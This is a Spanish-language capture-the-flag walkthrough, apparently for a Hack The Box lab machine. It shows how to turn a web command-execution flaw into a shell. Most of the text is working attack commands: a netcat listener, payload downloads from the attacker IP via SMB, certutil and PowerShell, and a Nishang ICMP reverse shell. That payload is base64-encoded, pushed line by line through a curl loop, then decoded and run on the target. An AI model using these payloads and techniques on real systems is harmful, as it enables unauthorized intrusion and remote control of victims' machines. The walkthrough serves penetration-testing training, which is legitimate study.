## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Preparamos un nc.exe para la maquina victima

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe ./content
    ```

1. Nos creamos un registro compartido a nivel de red

    ```bash
    cd content
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. En la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=\\10.10.14.8\smbFolder\nc.exe -e cmd 10.10.14.8 443
    ```

En este caso no responde y vemos un exit status 1. Intentamos de varias maneras

1. Nos creamos un registro compartido a nivel de red

    ```bash
    impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
    ```

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=net use x: \\10.10.14.8\smbFolder /user:s4vitar s4vitar123
```

No responde y vemos un exit status 2.

Intentamos con un servidor web.

1. Nos creamos un servidor web

    ```bash
    python3 -m http.server 80
    ```

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=certutil.exe -f -urlcache -split http://10.10.14.8/nc.exe nc.exe
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell iwr -uri http://10.10.14.8/nc.exe -OutFile test
```

No responde y vemos un exit status que no es 0.

Aqui vemos que las conexiones por TCP no funcionan. Puede ser porque hay reglas definidas que no permiten utilizar TCP y S4vitar
nos adelanta que tampoco funccionna por UDP.

Aqui hemos podido comprobar que:

- tenemos capacidad de ejecucion remota de commando.
- tenemos conectividad por trasa ICMP
- el protocolo TCP esta bloqueado
- el protocole UDP esta bloqueado

Segun esta analisis intentamos crearnos una reverse shell por **ICMP**

### Entablar una reverse shell por ICMP {-}

1. Nos descargamos el Nishang

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang
    cd Shells
    cp Invoke-PowerShellIcmp.ps1 ../../icmp.ps1
    cd ../..
    vi icmp.ps1
    ```

Aqui como tenemos que pasar por la url de la web para enviarnos el fichero, tenemos que preparar el fichero.

1. Ejecucion de comandos prealables en nuestra maquina

    ```bash
    sysctl -w net.ipv4.icmp_echo_ignore_all=1
    wget https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py
    ```

1. Añadimos el invoke al final del fichero

    ```bash
    Invoke-PowerShellIcmp -IPAddress 10.10.14.8
    ```

1. Borramos todo los comentarios que hay en el fichero
1. Borramos todo los saltos de linea

    ```bash
    cat icmp.ps1 | sed '/^\s*$/d' > icmp
    rm icmp.ps1
    mv icmp icmp.ps1
    ```

1. Utilizamos una powershell

    ```bash
    pwsh
    ```

1. Codificamos el fichero en base64

    ```bash
    $fileContent = Get-Content -Raw ./icmp.ps1
    $fileContent
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
    $encode = [Convert]::ToBase64String($bytes)
    $encode | Out-File icmp.ps1.b64
    ```

1. En una shell linux normal modificamos los symbolos `+` y `=` para encodearlos en urlencode

    ```bash
    php --interactive
    print urlencode("+");
    %2B
    print urlencode("=");
    %3D
    ```

1. Modificamos todos los symbolos `+` por **%2B** y los symbolos `=` por **%3D**
1. Spliteamos el fichero en dimensiones de lineas iguales

    ```bash
    fold icmp.ps1.b64 > icmp
    ```

1. Nos creamos un script para automatizar el envio de cada linea del fichero

    ```bash
    #!/bin/bash

    function ctrl_c(){
        echo -e "\n\n[!] Saliendo...\n"
        exit 1
    }
    
    # Ctrl+C
    trap ctrl_c INT

    for line in $(cat icmp.ps1.b64); do
        command="echo ${line} >> C:\Temp\reverse.ps1"
        curl -s -v -X GET "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$command"
    done
    ```

1. Lanzamos el Script

    ```bash
    ./fileUpload.sh
    ```

1. Controlamos en la web si el fichero existe

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type C:\Temp\reverse.ps1
    ```

    Vemos el status code a 0

1. Decodificamos desde la web el fichero que esta en base64
    
    - las etapas serian estas

        ```bash
        $file = Get-Content C:\Temp\reverse.ps1 
        $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
        $decode > C:\Temp\pwned.ps1
        ```

    - y en la url de la web seria:

        ```bash
        http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell $file = Get-Content C:\Temp\reverse.ps1; $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file)); $decode > C:\Temp\pwned.ps1
        ```

1. Lanzamos el script python previamente descargado

    ```bash
    rlwrap python icmpsh_m.py 10.10.14.8 10.10.10.57
    ```

1. Ejecutamos el pwned.ps1 desde la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell C:\Temp\pwned.ps1
    ```

Por fin estamos adentro de la maquina ;)

